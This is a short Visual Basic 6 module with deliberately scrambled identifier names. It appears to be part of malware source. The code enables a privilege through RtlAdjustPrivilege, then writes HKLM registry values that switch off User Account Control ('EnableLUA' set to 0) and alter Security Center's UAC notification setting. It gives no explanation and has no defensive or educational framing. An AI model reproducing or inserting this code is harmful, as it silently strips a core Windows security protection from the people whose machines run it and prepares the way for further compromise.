Attribute VB_Name = "Module3"
Public Declare Function RtlAdjustPrivilege Lib "NTDLL" (ByVal AhNpOOopN As Long, ByVal SMKqEnoyi As Boolean, ByVal rTfNwHMKp As Boolean, PNi9Y0n35 As Long) As Long
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal uHxt25YLI As Long, ByVal HGyEgZtCm As String, ByVal TBfIkP38M As Long, ByVal Tm99ucNVe As Long, Ern56ueJO As Long, ByVal QIGVDurEL As Long) As Long
Private Declare Function lKk8vKRbK Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal uHxt25YLI As Long, ByVal c2lcLg6LJ As String, ByVal HiwLVMmFh As Long, ByVal zZi4zPaus As Long, ivlx2F8Dw As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal uHxt25YLI As Long) As Long

Public Sub kEzsDtZRJ()
Dim z6P5Ys2QM As Long
Call RtlAdjustPrivilege(17, True, True, 0)
If lKk8vKRbK(&H80000002, "SOFTWARE\Microsoft\Security Center", 0&, &H20000 Or &H2& Or &H4&, z6P5Ys2QM) = 0& Then
If (RegSetValueExA(z6P5Ys2QM, "UACDisableNotify", 0, 4, 0, 4) = 0&) Then
RegCloseKey z6P5Ys2QM
End If
End If
If lKk8vKRbK(&H80000002, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0&, &H20000 Or &H2& Or &H4&, z6P5Ys2QM) = 0& Then
If (RegSetValueExA(z6P5Ys2QM, "EnableLUA", 0, 4, 0, 4) = 0&) Then
RegCloseKey z6P5Ys2QM
End If
End If
End Sub
